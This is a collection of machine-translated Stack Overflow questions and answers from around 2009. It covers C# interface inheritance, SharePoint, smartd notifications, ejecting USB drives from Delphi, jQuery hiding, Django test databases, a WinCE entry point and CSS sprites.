编辑：我一直假设构建文档的源代码具有包括两个接口的声明。另一种可能的选择是层次结构中的*所有*接口都由文档生成器自动拉入。在这种情况下，问题就变成了“为什么文档生成器会这样做”——答案几乎可以肯定仍然是“清晰”。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-01-12T07:15:16.197

`IList`仅`IEnumerable`由关联实施；即它实现`IEnumerable`正是**因为**它继承`ICollection`了 which is `IEnumerable`。你会得到相同的类型层次结构（尽管只有单一继承：

```
class Enumerable {}
class Collection : Enumerable {}
class List : Collection {} 
```

`List`一个`Enumerable`; _ 同理，`IList`是`IEnumerable`。

例如，如果我写：

```
interface IA {}
interface IB : IA { }
interface IC : IB { } 
```

看看元数据，然后看起来`IC : IA, IB`——但这只是间接的；这是IL：

```
.class private interface abstract auto ansi IA
{
}
.class private interface abstract auto ansi IB
    implements IA
{
}
.class private interface abstract auto ansi IC
    implements IB, IA
{
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-12T08:36:59.857

如果您要在 ReSharper 中打开代码，则表明不需要`IEnumerable`接口声明，因为它已经通过.`IList``ICollection`

# sql - 在 SQL 中访问共享点列表数据

> ID：434680
> 
> 赞同：0
> 
> 时间：2009-01-12T07:10:19.470
> 
> 标签：sql, sharepoint

我是 SharePoint 开发的新手。我有一个列表，这个列表有一个名为`Todaysdate`. 此列需要每天更新到今天的实际日期，因为它包含约 20,000 行，我不会每天手动更新它。因为它在计算行中使用。

我的问题是我可以只使用 SQL 并更新 UserData 表中与`datetime`我需要的列相对应的行吗？

我可以通过类似的方式查询行列表

```
Select * from UserData where tp_ListID = 'GUID' 
```

但列`datetime3`中包含的数据不仅仅是`Todaysdate`信息。我如何只返回`Todaysdate`信息？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-12T07:41:31.170

您真的不应该查询，更不用说直接使用 SQL 更新 SharePoint 内容数据库了。它完全不受支持，因此如果您破坏了某些东西，您将独自一人，并且数据库架构可能会随着未来的服务包/版本而改变。
同样正如 noesgard 在他的评论中提到的那样，您不需要它来在计算字段中使用今天的日期，请参阅[此博客条目](http://blogs.msdn.com/cjohnson/archive/2006/03/16/552314.aspx)以了解如何做到这一点。

# monitoring - 从 smartd (smartmontools) 接收电子邮件通知

> ID：434683
> 
> 赞同：0
> 
> 时间：2009-01-12T07:12:11.853
> 
> 标签：monitoring, sysadmin, hard-drive

为了获取有关我的 HDD 驱动器状况的信息，我配置了 smartmontools 守护程序（通过 smartd.conf），如下所示：

```
dev/sdb -I 194 -a -o on -S on -s (S/../.././03|L/../../6/04) \
    -m sys@example.com -M exec /usr/share/smartmontools/smartd-runner 
```

此外，通过添加“-M test”，我测试了电子邮件通知并收到了测试电子邮件。

如您所见，每天早上我的硬盘都会进行简短测试，但我没有收到任何有关测试结果的电子邮件通知。

可能会在出现问题时发送通知，我在这一点上是对的吗？我的意思是，如果测试通过了，没有收到任何东西是正常的吗？

现在我的驱动器通过`smartctl -H`命令报告 OK 状态。我使用 Debian Etch 和 Sendmail。

非常感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-18T11:15:33.973

既然您知道`-M test`，您显然已经`-M`在文档中找到了有关该选项的章节。在同一章中，您会发现：

```
exec  PATH  -  run the executable PATH instead of the default mail command,
               when smartd needs to send email.  PATH must point to an
               executable binary file or script. 
```

重要的词是**“代替”**。如果`smartd-runner`不自己发送邮件，您将不会收到任何消息。

到底有什么作用`smartd-runner`？我不熟悉那个脚本。

回答您的问题：当没有要报告的错误时不会发送邮件：

```
once - send only one warning email for each type of disk problem detected.
       This is the default. 
```

# delphi - 如何使用 delphi 以编程方式删除 USB 闪存盘？

> ID：434688
> 
> 赞同：12
> 
> 时间：2009-01-12T07:14:02.533
> 
> 标签：delphi, usb

如何使用 delphi 以编程方式检测和删除 USB 闪存盘？

我在这个网站上看到了一些例子，但他们缺乏关于如何去做的明确解释！

请举例真的很有帮助！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-01-12T10:49:36.017

这是[此示例代码](http://support.microsoft.com/default.aspx?scid=kb;en-us;165721)的快速而肮脏的翻译，用于从 support.microsoft.com 删除驱动器。但是，它仅适用于在我的系统上具有管理员权限的用户。

有关使用 USB 设备的更多信息，请按照[concept03](https://stackoverflow.com/users/12458/concept03)[此答案](https://stackoverflow.com/questions/85649/safe-remove-usb-drive-using-win32-api#321097)中的链接。

```
function OpenVolume(ADrive: char): THandle;
var
  RootName, VolumeName: string;
  AccessFlags: DWORD;
begin
  RootName := ADrive + ':\'; (* '\'' // keep SO syntax highlighting working *)
  case GetDriveType(PChar(RootName)) of
    DRIVE_REMOVABLE:
      AccessFlags := GENERIC_READ or GENERIC_WRITE;
    DRIVE_CDROM:
      AccessFlags := GENERIC_READ;
  else
    Result := INVALID_HANDLE_VALUE;
    exit;
  end;
  VolumeName := Format('\\.\%s:', [ADrive]);
  Result := CreateFile(PChar(VolumeName), AccessFlags,
    FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING, 0, 0);
  if Result = INVALID_HANDLE_VALUE then
    RaiseLastWin32Error;
end;

function LockVolume(AVolumeHandle: THandle): boolean;
const
  LOCK_TIMEOUT = 10 * 1000; // 10 Seconds
  LOCK_RETRIES = 20;
  LOCK_SLEEP = LOCK_TIMEOUT div LOCK_RETRIES;

// #define FSCTL_LOCK_VOLUME CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 6, METHOD_BUFFERED, FILE_ANY_ACCESS)
  FSCTL_LOCK_VOLUME = (9 shl 16) or (0 shl 14) or (6 shl 2) or 0;
var
  Retries: integer;
  BytesReturned: Cardinal;
begin
  for Retries := 1 to LOCK_RETRIES do begin
    Result := DeviceIoControl(AVolumeHandle, FSCTL_LOCK_VOLUME, nil, 0,
      nil, 0, BytesReturned, nil);
    if Result then
      break;
    Sleep(LOCK_SLEEP);
  end;
end;

function DismountVolume(AVolumeHandle: THandle): boolean;
const
// #define FSCTL_DISMOUNT_VOLUME CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 8, METHOD_BUFFERED, FILE_ANY_ACCESS)
  FSCTL_DISMOUNT_VOLUME = (9 shl 16) or (0 shl 14) or (8 shl 2) or 0;
var
  BytesReturned: Cardinal;
begin
  Result := DeviceIoControl(AVolumeHandle, FSCTL_DISMOUNT_VOLUME, nil, 0,
    nil, 0, BytesReturned, nil);
  if not Result then
    RaiseLastWin32Error;
end;

function PreventRemovalOfVolume(AVolumeHandle: THandle;
  APreventRemoval: boolean): boolean;
const
// #define IOCTL_STORAGE_MEDIA_REMOVAL CTL_CODE(IOCTL_STORAGE_BASE, 0x0201, METHOD_BUFFERED, FILE_READ_ACCESS)
  IOCTL_STORAGE_MEDIA_REMOVAL = ($2d shl 16) or (1 shl 14) or ($201 shl 2) or 0;
type
  TPreventMediaRemoval = record
    PreventMediaRemoval: BOOL;
  end;
var
  BytesReturned: Cardinal;
  PMRBuffer: TPreventMediaRemoval;
begin
  PMRBuffer.PreventMediaRemoval := APreventRemoval;
  Result := DeviceIoControl(AVolumeHandle, IOCTL_STORAGE_MEDIA_REMOVAL,
    @PMRBuffer, SizeOf(TPreventMediaRemoval), nil, 0, BytesReturned, nil);
  if not Result then
    RaiseLastWin32Error;
end;

function AutoEjectVolume(AVolumeHandle: THandle): boolean;
const
// #define IOCTL_STORAGE_EJECT_MEDIA CTL_CODE(IOCTL_STORAGE_BASE, 0x0202, METHOD_BUFFERED, FILE_READ_ACCESS)
  IOCTL_STORAGE_EJECT_MEDIA = ($2d shl 16) or (1 shl 14) or ($202 shl 2) or 0;
var
  BytesReturned: Cardinal;
begin
  Result := DeviceIoControl(AVolumeHandle, IOCTL_STORAGE_EJECT_MEDIA, nil, 0,
    nil, 0, BytesReturned, nil);
  if not Result then
    RaiseLastWin32Error;
end;

function EjectVolume(ADrive: char): boolean;
var
  VolumeHandle: THandle;
begin
  Result := FALSE;
  // Open the volume
  VolumeHandle := OpenVolume(ADrive);
  if VolumeHandle = INVALID_HANDLE_VALUE then
    exit;
  try
    // Lock and dismount the volume
    if LockVolume(VolumeHandle) and DismountVolume(VolumeHandle) then begin
      // Set prevent removal to false and eject the volume
      if PreventRemovalOfVolume(VolumeHandle, FALSE) then
        AutoEjectVolume(VolumeHandle);
    end;
  finally
    // Close the volume so other processes can use the drive
    CloseHandle(VolumeHandle);
  end;
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
  EjectVolume('E');
end; 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-14T16:34:29.383

移除 USB 驱动器的关键是使用[CM_Request_Device_Eject](http://msdn.microsoft.com/en-us/library/windows/hardware/ff539806%28v=vs.85%29.aspx)函数，

根据这篇文章检查这个示例 delphi 应用程序，[`How to Prepare a USB Drive for Safe Removal`](http://www.codeproject.com/Articles/13839/How-to-Prepare-a-USB-Drive-for-Safe-Removal)它使用[`JEDI API Library & Security Code Library`](http://sourceforge.net/projects/jedi-apilib/)

```
{$APPTYPE CONSOLE}

{$R *.res}

uses
  JwaWinIoctl,
  Cfg,
  CfgMgr32,
  SetupApi,
  Windows,
  SysUtils;

function GetDrivesDevInstByDeviceNumber(DeviceNumber : LONG; DriveType : UINT; szDosDeviceName: PChar) : DEVINST;
var
 StorageGUID : TGUID;
 IsFloppy : Boolean;
 hDevInfo : SetupApi.HDEVINFO;
 dwIndex  : DWORD;
 res      : BOOL;
 pspdidd  : PSPDeviceInterfaceDetailData;
 spdid    : SP_DEVICE_INTERFACE_DATA;
 spdd     : SP_DEVINFO_DATA;
 dwSize   : DWORD;
 hDrive   : THandle;
 sdn      : STORAGE_DEVICE_NUMBER;
 dwBytesReturned : DWORD;
begin
  Result:=0;
    IsFloppy := pos('\\Floppy', szDosDeviceName)>0; // who knows a better way?
    case DriveType of
    DRIVE_REMOVABLE:
                if ( IsFloppy ) then
                  StorageGUID := GUID_DEVINTERFACE_FLOPPY
                else
                  StorageGUID := GUID_DEVINTERFACE_DISK;

    DRIVE_FIXED:  StorageGUID := GUID_DEVINTERFACE_DISK;
    DRIVE_CDROM:    StorageGUID := GUID_DEVINTERFACE_CDROM;
    else
        exit
  end;

    // Get device interface info set handle for all devices attached to system
    hDevInfo := SetupDiGetClassDevs(@StorageGUID, nil, 0, DIGCF_PRESENT OR DIGCF_DEVICEINTERFACE);
  if (NativeUInt(hDevInfo) <> INVALID_HANDLE_VALUE) then
  try
    // Retrieve a context structure for a device interface of a device information set
    dwIndex := 0;
    //PSP_DEVICE_INTERFACE_DETAIL_DATA pspdidd = (PSP_DEVICE_INTERFACE_DETAIL_DATA)Buf;
    spdid.cbSize := SizeOf(spdid);

    while true do
    begin
      res := SetupDiEnumDeviceInterfaces(hDevInfo, nil, StorageGUID, dwIndex, spdid);
      if not res then
        break;

      dwSize := 0;
      SetupDiGetDeviceInterfaceDetail(hDevInfo, @spdid, nil, 0, dwSize, nil); // check the buffer size

      if ( dwSize<>0) then
      begin
       pspdidd := AllocMem(dwSize);
       try
        pspdidd.cbSize := SizeOf(TSPDeviceInterfaceDetailData);
        ZeroMemory(@spdd, sizeof(spdd));
        spdd.cbSize := SizeOf(spdd);
        res := SetupDiGetDeviceInterfaceDetail(hDevInfo, @spdid, pspdidd, dwSize, dwSize, @spdd);
        if res then
        begin
          // open the disk or cdrom or floppy
          hDrive := CreateFile(pspdidd.DevicePath, 0, FILE_SHARE_READ OR FILE_SHARE_WRITE, nil, OPEN_EXISTING, 0, 0);
         if ( hDrive <> INVALID_HANDLE_VALUE ) then
          try
              // get its device number
              dwBytesReturned := 0;
              res := DeviceIoControl(hDrive, IOCTL_STORAGE_GET_DEVICE_NUMBER, nil, 0, @sdn, sizeof(sdn), dwBytesReturned, nil);
              if res  then
              begin
                if ( DeviceNumber = sdn.DeviceNumber) then
                begin  // match the given device number with the one of the current device
                  Result:= spdd.DevInst;
                  exit;
                end;
              end;
          finally
            CloseHandle(hDrive);
          end;
        end;
       finally
         FreeMem(pspdidd);
       end;
      end;
      Inc(dwIndex);
    end;
  finally
   SetupDiDestroyDeviceInfoList(hDevInfo);
  end;
end;

procedure EjectUSB(const DriveLetter:char);
var
  szRootPath, szDevicePath : PChar;
  szVolumeAccessPath : PChar;
  hVolume : THandle;
  DeviceNumber : LONG;
  sdn  : STORAGE_DEVICE_NUMBER;
  dwBytesReturned : DWORD;
  res : BOOL;
  resCM : Cardinal;
  DriveType : UINT;
  szDosDeviceName : array [0..MAX_PATH-1] of Char;
  DevInst  : CfgMgr32.DEVINST;
  VetoType : PNP_VETO_TYPE;
  VetoName : array [0..MAX_PATH-1] of WCHAR;
  bSuccess : Boolean;
  DevInstParent : CfgMgr32.DEVINST;
  tries :  Integer;
begin
    szRootPath := PChar(DriveLetter+':\');
    szDevicePath := PChar(DriveLetter+':');
  szVolumeAccessPath := PChar(Format('\\.\%s:',[DriveLetter]));

  DeviceNumber:=-1;
    // open the storage volume
  hVolume := CreateFile(szVolumeAccessPath, 0, FILE_SHARE_READ OR FILE_SHARE_WRITE, nil, OPEN_EXISTING, 0, 0);
    if (hVolume <> INVALID_HANDLE_VALUE) then
   try
    //get the volume's device number
    dwBytesReturned := 0;
    res := DeviceIoControl(hVolume, IOCTL_STORAGE_GET_DEVICE_NUMBER, nil, 0, @sdn, SizeOf(sdn), dwBytesReturned, nil);
    if res then
      DeviceNumber := sdn.DeviceNumber;
   finally
     CloseHandle(hVolume);
   end;
   if DeviceNumber=-1 then exit;

    // get the drive type which is required to match the device numbers correctely
    DriveType := GetDriveType(szRootPath);

    // get the dos device name (like \device\floppy0) to decide if it's a floppy or not - who knows a better way?
    QueryDosDevice(szDevicePath, szDosDeviceName, MAX_PATH);

    // get the device instance handle of the storage volume by means of a SetupDi enum and matching the device number
    DevInst := GetDrivesDevInstByDeviceNumber(DeviceNumber, DriveType, szDosDeviceName);

    if ( DevInst = 0 ) then
   exit;

  VetoType := PNP_VetoTypeUnknown;
    bSuccess := false;

    // get drives's parent, e.g. the USB bridge, the SATA port, an IDE channel with two drives!
    DevInstParent := 0;
    resCM := CM_Get_Parent(DevInstParent, DevInst, 0);

    for tries:=0 to 3 do // sometimes we need some tries...
  begin
        FillChar(VetoName[0], SizeOf(VetoName), 0);

        // CM_Query_And_Remove_SubTree doesn't work for restricted users
        //resCM = CM_Query_And_Remove_SubTree(DevInstParent, &VetoType, VetoNameW, MAX_PATH, CM_REMOVE_NO_RESTART); // CM_Query_And_Remove_SubTreeA is not implemented under W2K!
        //resCM = CM_Query_And_Remove_SubTree(DevInstParent, NULL, NULL, 0, CM_REMOVE_NO_RESTART);  // with messagebox (W2K, Vista) or balloon (XP)

        resCM := CM_Request_Device_Eject(DevInstParent, @VetoType, @VetoName[0], Length(VetoName), 0);
        resCM := CM_Request_Device_Eject(DevInstParent,nil, nil, 0, 0); // optional -> shows messagebox (W2K, Vista) or balloon (XP)

        bSuccess := (resCM=CR_SUCCESS) and (VetoType=PNP_VetoTypeUnknown);
        if ( bSuccess )  then
            break;

        Sleep(500); // required to give the next tries a chance!
    end;

    if ( bSuccess ) then
        Writeln('Success')
  else
      Writeln('Failed');
end;

begin
  try
    LoadSetupApi;
    LoadConfigManagerApi;
    EjectUSB('F');
  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
  Readln;

end. 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-14T02:00:12.757

这不会弹出驱动器，但会刷新驱动器缓冲区并使其安全移除。它需要 Vista 和更高版本下的管理权限（如果作为有限权限用户运行，则需要 XP，IIRC）。它可能应该尝试一下..finally 以确保它`CloseHandle`被调用；我把它作为练习留给读者，因为这里的代码格式很紧凑，没有水平滚动。:-)

```
unit USBDriveFlush;

interface

  uses Windows;

type
  // Taken from JEDI JwaWinIoctl
  PSTORAGE_HOTPLUG_INFO = ^STORAGE_HOTPLUG_INFO;
  {$EXTERNALSYM PSTORAGE_HOTPLUG_INFO}
  _STORAGE_HOTPLUG_INFO = record
    Size: DWORD; // version
    MediaRemovable: BOOLEAN; // ie. zip, jaz, cdrom, mo, etc. vs hdd
    MediaHotplug: BOOLEAN;   // ie. does the device succeed a lock 
                             // even though its not lockable media?
    DeviceHotplug: BOOLEAN;  // ie. 1394, USB, etc.
    WriteCacheEnableOverride: BOOLEAN; // This field should not be 
                             // relied upon because it is no longer used
  end;
  {$EXTERNALSYM _STORAGE_HOTPLUG_INFO}
  STORAGE_HOTPLUG_INFO = _STORAGE_HOTPLUG_INFO;
  {$EXTERNALSYM STORAGE_HOTPLUG_INFO}
  TStorageHotplugInfo = STORAGE_HOTPLUG_INFO;
  PStorageHotplugInfo = PSTORAGE_HOTPLUG_INFO;    

  function FlushUSBDrive(const Drive: string): Boolean;

implementation

function FlushUSBDrive(const Drive: string): Boolean;
var
  shpi : TStorageHotplugInfo;
  retlen : DWORD; //unneeded, but deviceiocontrol expects it
  h : THandle;
begin
  Result := False;
  h := CreateFile(PChar('\\.\' + Drive),
                  0,
                  FILE_SHARE_READ or FILE_SHARE_WRITE,
                  nil,
                  OPEN_EXISTING,
                  0,
                  0);
  if h <> INVALID_HANDLE_VALUE then
  begin
    shpi.Size := SizeOf(shpi);

    if DeviceIoControl(h,
                       IOCTL_STORAGE_GET_HOTPLUG_INFO,
                       nil,
                       0,
                       @shpi,
                       SizeOf(shpi),
                       retlen,
                       nil) then
    begin
      //shpi now has the existing values, so you can check to
      //see if the device is already hot-pluggable
      if not shpi.DeviceHotplug then
      begin
        shpi.DeviceHotplug:= True;

        //Need to use correct administrator security privilages here
        //otherwise it'll just give 'access is denied' error
        Result := DeviceIoControl(h,
                                  IOCTL_STORAGE_SET_HOTPLUG_INFO,
                                   @shpi,
                                   SizeOf(shpi),
                                   nil,
                                   0,
                                   retlen,
                                   nil);
      end;
    end;
    CloseHandle(h);
  end;
end; 
```

样品用途：

```
if FlushUSBDrive('G:') then
  ShowMessage('Safe to remove USB drive G:')
else
  ShowMessage('Flush of drive G: failed!' +
    SysErrorMessage(GetLastError())); 
```

# javascript - 如何在 jQuery 中隐藏新元素？

> ID：434694
> 
> 赞同：4
> 
> 时间：2009-01-12T07:17:05.837
> 
> 标签：javascript, jquery, firefox, dom, google-chrome

我有这个代码：

```
var $msg = jQuery('<div></div>')
    .hide()
    .appendTo(document.body)
;
if ($msg.is(":hidden")) {
    console.log("hidden");
} else {
    console.log("visible");
} 
```

运行时，它会登录`"hidden"`Firefox，但会登录`"visible"`Google Chrome。这是一个错误，还是我做错了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-12T07:19:39.950

您是否尝试将其附加到正文后隐藏？

```
$(function() {
    var $msg = jQuery('<div>hello</div>').appendTo(document.body).hide();
    if ($msg.is(":hidden")) {
        console.log("hidden");
    } else {
        console.log("visible");
    }
}); // $() 
```

在两种浏览器上都为我工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-12T07:26:27.580

正如 eed3si9n 所说，这是`.hide()`通话在通话之前`.appendTo()`。

我想我会添加这个答案，因为我发现了另一种也可以使用的方法：

```
jQuery('<div></div>')
    .css("display", "none")
    .appendTo(document.body)
; 
```

我不确切知道它是否像这样工作，但我想将元素添加到隐藏的 DOM 应该更快，因为浏览器不需要渲染它？

* * *

对于那些像我一样并且必须确切知道事情是如何运作的人的更新：

jQuery.hide() 的代码 - 我添加的评论

```
hide: function(speed,callback){
    return speed ?

        // this block of code won't be run, since speed will be undefined
        this.animate({
            height: "hide", width: "hide", opacity: "hide"
        }, speed, callback) :

        // this is the relevant code
        this.filter(":visible").each(function(){
            this.oldblock = this.oldblock || jQuery.css(this,"display");

            // you can see here that it merely sets the display to 'none'
            this.style.display = "none";
        }).end();
} 
```

这是选择器的代码`:hidden`：

```
hidden: function(a) {
    return "hidden" == a.type                        // <input type="hidden" />
        || jQuery.css(a, "display") == "none"        // style.display = none
        || jQuery.css(a, "visibility") == "hidden";  // style.visibility = hidden
} 
```

This doesn't really explain why Chrome isn't showing the element as hidden though...

# python - 在每个测试方法之前清理 django 中的数据库

> ID：434700
> 
> 赞同：23
> 
> 时间：2009-01-12T07:22:59.600
> 
> 标签：python, django, unit-testing, django-models

默认情况下，当 Django 针对 sqlite 后端运行时，它会在内存中创建一个新的数据库进行测试。这意味着对于从 unittest.TestCase 派生的每个类，我都会获得一个新数据库。可以更改它以便在运行每个测试方法之前将其清除吗？

示例：我正在测试一个在 Django 持久对象之上提供额外抽象的管理器类。代码看起来更像那样

```
class TestForManager(unittest.TestCase):
  def testAddingBlah(self):
    manager = Manager()
    self.assertEquals(manager.getBlahs(), 0)
    manager.addBlah(...)
    self.assertEquals(manager.getBlahs(), 1)

  def testAddingBlahInDifferentWay(self):
    manager = Manager()
    self.assertEquals(manager.getBlahs(), 0)
    manager.addBlahInDifferentWay(...)
    self.assertEquals(manager.getBlahs(), 1) 
```

现在，第二个测试的第一个断言失败，因为数据库的状态在测试调用之间被保留并且数据库中已经有一个实例`Blah`。

* * *

## 回答 #1

> 赞同：59
> 
> 时间：2009-01-12T19:59:19.337

`django.test.TestCase`不使用`unittest.TestCase`。它适用于所有主要版本的 Django！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2010-12-14T11:11:26.347

您可以使用该`tearDown`方法。它将在您的测试运行后调用。您可以删除那里的所有 Blahs。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-02-21T14:25:49.553

使它们在两个不同的功能中都不是测试功能。最后从一个测试函数调用依赖函数。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-12T10:54:59.687

为什么不执行以下操作？这可以完成您所需要的，而无需对您的代码进行重大更改。

```
class TestOneForManager(unittest.TestCase):
  def testAddingBlah(self):
    manager = Manager()
    self.assertEquals(manager.getBlahs(), 0)
    manager.addBlah(...)
    self.assertEquals(manager.getBlahs(), 1)

class TestTwoForManager(unittest.TestCase):
  def testAddingBlahInDifferentWay(self):
    manager = Manager()
    self.assertEquals(manager.getBlahs(), 0)
    manager.addBlahInDifferentWay(...)
    self.assertEquals(manager.getBlahs(), 1) 
```

* * *

**编辑**. “在 TestCase 上重置”功能可让您完全控制。

*   当您拥有互不干扰的测试用例时，单个 TestCase 中的许多测试方法都很好。

*   当您有相互干扰的测试用例时，单个 TestCase 中的测试方法很少是好的。

您可以通过将测试方法分组到一个或多个 TestCases 中来选择适用于您的测试的模型。您拥有完全的控制权。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-01-07T07:04:13.457

要清除非默认数据库，`multi_db = True`请在类中添加

例如

```
class MyTestCase(django.test.TestCase)
    multi_db = True

    def test_one(self):
        self.assertTrue(True) 
```

# c++ - 普通主到 WinCE 主

> ID：434702
> 
> 赞同：2
> 
> 时间：2009-01-12T07:23:24.373
> 
> 标签：c++, windows-ce, evc4

我正在将现有的（主要是）跨平台应用程序移植到 WinCE 4.2。该函数的当前入口点是

```
int main(int argc, char *argv[]){} 
```

我想保持这部分原样，并让 WinCE 入口点简单地调用它。我相信类似以下的东西应该有效：

```
int WINAPI WinMain( HINSTANCE hInstance,
                    HINSTANCE hPrevInstance,
                    LPTSTR    lpCmdLine,
                    int       nCmdShow) 
{
    int argc = _tcslen(lpCmdLine);
    char *argv = new char[argc];
    wcstombs(argv,lpCmdLine,1024);
    argc = main(argc,&argv);
    delete [] argv;
    return argc;
} 
```

它编译，一旦我弄清楚链接器为什么会抛出，它应该运行，但它是对的吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2010-10-19T15:40:32.603

真正简单的方法是更改​​项目的链接器入口点并使用 main(...) 函数。

打开项目属性对话框，然后转到“链接器->高级”并根据以下内容设置“入口点”值：

如果您的切入点是这样的：

```
int main(int argc, char *argv[]) 
```

然后将入口点设置为`mainACRTStartup`

但如果你开始：

```
int _tmain(int argc, TCHAR *argv[]) 
```

那么入口点是`mainWCRTStartup`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-12T07:37:59.770

您的一般想法是正确的，但是您转换 lpCmdLine 可能会给您带来一些问题。考虑以下：

$> myprogam.exe -a shortargument -b -c -d "带空格的长参数"

传递给您的主函数的参数将是这样的：

```
argc = 7;
argv = {
    "myprogram.exe",
    "-a",
    "shortargument",
    "-b",
    "-c",
    "-d",
    "long argument with spaces"
}; 
```

然而，WinMain 将收到一个像这样的大长字符串：

```
lpCmdLine = "-a shortargument -b -c -d "long argument with spaces""; 
```

因此，如果您正在进行任何命令行选项解析，您可能会破坏它。最通用的方法是循环通过 lpCmdLine 将所有空格（当然匹配引号之外）设置为空字符（即 '\0' 或简单地 0）并跟踪指向第一个有效字符的指针空字符序列。

**另外：**如果我从我做wince开发时没记错的话，我似乎记得lpCmdLine只是为了与win32兼容而存在，所以它总是空的。要获得命令行，我认为您必须使用[GetCommandLine](http://msdn.microsoft.com/en-us/library/ms885605.aspx)。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-13T05:26:35.417

谢谢你们两位的有用回答。我写了以下内容，这和我们现在需要的一样有效。只有我们的代码会调用这个可执行文件，而不是带引号，尽管添加起来并不难。此外，如果参数之间有多个空格，它可能效果不佳，但同样，我们不必担心其他人使用这个程序，它只是用于学术目的。如果您认为有必要进行改进，请编辑此帖子，并在您的评论中证明它的合理性。

```
int WINAPI WinMain( HINSTANCE hInstance,
                    HINSTANCE hPrevInstance,
                    LPTSTR    lpCmdLine,
                    int       nCmdShow ) {
  assert(lpCmdLine != NULL);

  int argc = 1, ret = 0;
  std::vector<char*>  args;

  // Copy the entire array to a regular cstr
  int cmdLineLen = _tcslen(lpCmdLine);
  char *argv = new char[cmdLineLen];
  wcstombs(argv,lpCmdLine,cmdLineLen);
  args.push_back(&argv[0]);

  // Replace spaces with nulls to effectively create array of cstr
  for(int i=0; i<cmdLineLen; i++){
    if(argv[i] == ' '){
      argv[i] = '\0';
      args.push_back(&argv[i+1]); // Keep track of the first char in each word
      argc++;
    }
  }

  // argv[argc] should be NULL. 
  args.push_back(NULL);

  try{ // Run the program
    ret = main(argc,&args[0]);
  }
  catch(...){
    // TODO: Report error here. Commented code works OK for WinCE .NET
    // delete argv;
    // throw; 
    ret = -1;
  }
  delete argv;
  return ret;
} 
```

另外，对于那些感兴趣的人，在命令行运行它

```
>myprogam.exe -a shortargument -b -c 
```

将以下内容放入 lpCmdLine

```
"-a shortargument -b -c" 
```

另外，我的第一个猜测是 argv 需要删除 []'d（因为我是 new char[]'d），但是当我这样做时，程序出现了致命错误。当我切换到上述内容时，它起作用了。这不违反 new->delete/new[]->delete[] 规则吗？

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-12T07:56:23.930

不，那是行不通的。

```
int WINAPI WinMain( HINSTANCE hInstance,
                HINSTANCE hPrevInstance,
                LPTSTR    lpCmdLine,
                int       nCmdShow) 
{
    // argc: This is the number of arguments NOT the strlen
    int argc = _tcslen(lpCmdLine);

    // argv: Is an array of char* NOT an array of char.
    char *argv = new char[argc];
    wcstombs(argv,lpCmdLine,1024);

    // The argument passed as argc is not valid here.
    argc = main(argc,&argv);
    delete argv;

    // You are returning the result of main that is correct.
    // But re-using argc like this is smelly. Declare a new
    // variable and let the compiler optimise away the extra use
    // the compiler is VERY good at that.
    return argc;
} 
```

好的。不是 WinCE 专家。如果我这样做，我会使用 std::vector 你可以修改工作

```
int WINAPI WinMain( HINSTANCE hInstance,
                HINSTANCE hPrevInstance,
                LPTSTR    lpCmdLine,
                int       nCmdShow) 
{
    std::vector<char*>  args;

    // Split lpCmdLine by space.
    // Remember to watch for quotes when splitting (From 'Kevin Loney')
    // For each argument do
    args.push_back(<SOMTHING>)

    // The last argv[argc] should be NULL. 
    args.push_back(NULL);

    int result;
    try
    {
        // argc does not include the last NULL so do a -1
        result = main(args.size()-1,&args[0]);
    }
    catch(...)
    {
        // If <SOMTHING> includes dynamically allocating memory
        // Then you should delete it here.

        throw;  // Re-Throw the exception to get the same behavior.
    }

    return result;
} 
```

# html - 扩展的 css sprite 不能与：hover 一起使用？

> ID：434703
> 
> 赞同：4
> 
> 时间：2009-01-12T07:24:52.903
> 
> 标签：html, css, xhtml, css-sprites

我刚刚遇到了这篇关于 css sprites 扩展的[文章](http://www.jennifersemtner.com/css/101/extending-css-spriting/)，它启用了前景图像的 spriting 技巧。我[尝试](http://www.kavoir.com/2009/01/extended-css-sprites-for-foreground-images-img.html)在 :hover 上使用该技术，但它似乎不适用于 IE 和 Opera。请参阅我尝试在此处使用此技术作为菜单：[http ://www.kavoir.com/examples/jenny-css-sprites/menu.html](http://www.kavoir.com/examples/jenny-css-sprites/menu.html)

在 FF 和 Safari 上，它可以正常工作，但在 IE 和 Opera 中根本不工作。以几种方式修改了代码，但仍然根本不起作用。也许这是不可能的？

试图问作者，但她删除了我的评论。

知道如何在所有浏览器上进行这项工作吗？

更新：感谢您的回答，但 :hover 适用于 ，所以我相信所有的 IE 浏览器都应该解决这个问题。因此，问题很可能与剪辑属性有关。

我只是想确定 :hover 是否可以在 clip on 上正常工作。到目前为止似乎没有。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-12T15:34:34.897

所描述的整个技术对我来说似乎有问题。

詹妮弗的观点：

1.  出于可访问性目的，您不能将替代文本附加到 div
2.  CSS Spriting 和 IE6 PNG 修复不兼容
3.  除非选择了打印背景图像的客户端选项，否则图像不会在打印输出上打印出来（这对徽标和菜单等不利）
4.  对于页面中的图像（实际上不是背景图像），在 CSS 中隐藏图像在语义上似乎很糟糕。

第一，考虑到这些是背景图像，而不是它们本身的语义图像，我认为正确的方法是将文本直接放在标记中并用 CSS 隐藏它，而不是反过来。

数字 2 是有效的，但不是世界末日。采取行动 3 是一种滥用恕我直言 - 如果用户不想打印背景图像，你为什么要强迫这个？这又回到了语义解释。

